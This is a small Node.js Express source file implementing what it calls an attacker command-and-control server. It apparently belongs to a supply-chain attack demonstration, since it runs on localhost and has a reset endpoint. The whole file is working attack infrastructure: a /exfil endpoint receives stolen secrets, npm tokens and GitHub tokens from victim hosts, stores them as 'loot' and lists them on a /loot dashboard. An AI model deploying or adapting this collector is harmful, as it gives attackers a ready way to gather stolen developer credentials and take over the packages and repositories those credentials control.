const express = require("express");
const app = express();
const PORT = 4444;

app.use(express.json());

// In-memory store of exfiltrated data
const loot = [];

// C2 endpoint — receives stolen secrets
app.post("/exfil", (req, res) => {
  const entry = {
    timestamp: new Date().toISOString(),
    hostname: req.body.hostname,
    secrets: req.body.secrets,
    npmToken: req.body.npmToken,
    githubToken: req.body.githubToken,
  };
  loot.push(entry);
  console.log(`\n  [+] Received exfiltrated secrets from: ${entry.hostname}`);
  console.log(`      Secrets found: ${Object.keys(entry.secrets || {}).length}`);
  console.log(`      NPM token:    ${entry.npmToken ? "YES" : "no"}`);
  console.log(`      GitHub token:  ${entry.githubToken ? "YES" : "no"}`);
  res.json({ status: "ok" });
});

// Dashboard endpoint — view collected loot
app.get("/loot", (_req, res) => {
  res.json(loot);
});

// Reset
app.post("/reset", (_req, res) => {
  loot.length = 0;
  res.json({ status: "reset" });
});

app.listen(PORT, () => {
  console.log(`\n  💀 Attacker C2 server listening on http://localhost:${PORT}\n`);
});
